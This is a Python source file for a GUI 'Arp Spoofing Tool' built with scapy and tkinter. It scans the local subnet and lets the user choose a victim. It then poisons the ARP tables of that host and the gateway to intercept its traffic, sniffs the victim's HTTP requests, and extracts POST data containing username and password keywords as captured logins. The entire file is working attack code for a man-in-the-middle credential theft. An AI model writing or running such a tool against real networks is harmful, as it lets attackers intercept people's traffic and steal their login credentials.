from scapy.all import *
import socket
from tkinter import *
from time import sleep
from scapy.layers.http import HTTPRequest
import threading

info_count = 1

def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	my_ip = s.getsockname()[0]
	s.close()
	return my_ip
	
def get_gateway():
	packet = sr1(IP(dst='www.google.com',ttl=1)/ICMP())
	return packet.src
	
def ip_sniffing(): # return list
	target_ip = "10.0.2.1/24"
	arp = ARP(pdst=target_ip) #ARP query
	ether = Ether(dst="ff:ff:ff:ff:ff:ff") #boradcast
	packet = ether/arp #fill packet
	result = srp(packet, timeout=3)[0]
    
	live = []
	for sent, received in result:
		live.append({'ip':received.psrc, 'mac': received.hwsrc})
		if gateway == received.psrc:
			global gateway_mac
			gateway_mac = received.hwsrc
	"""
	print("Available devices in the network:")
	print("IP" + " "*18+"MAC")
	for live_i in live:
		print("{:16}    {}".format(live_i['ip'], live_i['mac']))
	"""
	return live
	
def arp_atk(tg_ip, tg_mac, spoof_ip):
	packet = ARP(op=2, pdst=tg_ip,
				hwdst=tg_mac, psrc=spoof_ip)
	send(packet, verbose=False)
	return
	
def trigger_stop():
	global stop 
	stop = True
	return
	
def start_atk(tg_ip,tg_mac):
	while(not stop):
		arp_atk(tg_ip,tg_mac, gateway)
		arp_atk(gateway, gateway_mac, tg_ip)
		sleep(1)
	print("restore victim arp table")
	restore(tg_ip,tg_mac, gateway, gateway_mac)
	restore(gateway, gateway_mac, tg_ip,tg_mac)
	btn.config(command=trigger_spoof, text="spoof")
		
def trigger_spoof():
		index = listbox.curselection()
		global target_ip, target_mac
		target = listbox.get(index)
		target_ip,target_mac = target.split(' ',1)
		target_mac = target_mac.replace(" ","")
		global stop
		stop = False
		print("target ip :" + target_ip + "  MAC :" + target_mac)
		print("gateway ip :" + gateway + "  MAC :" + gateway_mac )
		btn.config(command=trigger_stop, text="stop spoof")
		t = threading.Thread(target = start_atk, args = (target_ip,target_mac))
		t.start()
		sniffing()

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)
    
def sniffing():
	sniffer = AsyncSniffer(iface="eth0",filter="host " + target_ip,  prn = process_sniffed_packet, stop_filter = stop_sniff)
	sniffer.start()
	print("start sniff packet from " + target_ip)
	
def stop_sniff(x):
	if stop :
		print("stop sniffing packet")
		return True
	else:
		return False
		
def process_sniffed_packet(packet):
	"""
	if IP in packet:
		src = packet[IP].src
		dst = packet[IP].dst
		print("get packet src: " + src + "  dst : " + dst )
	"""
	if packet.haslayer(HTTPRequest):
		src = packet[IP].src
		dst = packet[IP].dst
		
		url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
		# print("[+] HTTP Request >> " + url)
		method = packet[HTTPRequest].Method.decode()
		login_info = get_login_info(packet)
		if login_info and method == 'POST':
			print("\n\n[+] Possible username/password > "
				+ login_info
				+ "\n\n")
			msg = src + " "*10 + dst + " "*10 + url + " "*10 + login_info
			global info_count
			sniffed_info.insert(info_count, msg)
			info_count+=1
		
def get_login_info(packet):
	if packet.haslayer(Raw):
		load = packet[Raw].load.decode()
		keywords = ["username", "uname",
					"user", "login",
					"password", "pass", 
					"txtPassword","txtUsername"]
		for keyword in keywords:
			if keyword in load:
				return load

def gui_init(live_user): # config gui
	root.title("Arp Spoofing Tool")
	root.geometry("720x480")
	root.config(bg="#323232")
	
	lb = Label(bg="#323232",fg="white", text="Choose Spoof Target")
	lb.pack()
	
	lb1 = Label(bg="#323232",fg="white", text="Your IP :" + get_ip() + "                      Default_gateway :" + gateway)
	lb1.pack()
	
	# label = "IP" + " "*24+"MAC"
	# listbox.insert(0,label)
	for item in live_user:
		insert_str = "{:16}    {}".format(item['ip'], item['mac'])
		listbox.insert(live_user.index(item)+1,insert_str)
	listbox.pack()
	
	btn.config(bg="gray")
	# btn.config(width=10,height=5)
	# btn.config(image)
	btn.config(command=trigger_spoof)
	btn.pack()
	
	lb2 = Label(bg="#323232",fg="white", text="Sniffed data")
	lb2.pack()
	sniffed_info.insert(0," "*5 +"Src IP "+ " "*5 +" | "  + " "*10 + " Dst IP "+ " "*10 + " | " + " "*20 + "site" + " "*20 + " | " + " " *20 + " Info " + " " *20)
	sniffed_info.pack(side="left")
	root.mainloop()
	
def main():
	global gateway
	gateway = get_gateway()
	live_user = ip_sniffing()
	gui_init(live_user)

my_ip = get_ip()
target_ip = ""
target_mac = ""
gateway =""
gateway_mac=""
stop = True

root = Tk()
listbox = Listbox(root,width=30,height=5)
sniffed_info = Listbox(root,width=90,height=15)
btn = Button(root,text="spoof")
main()
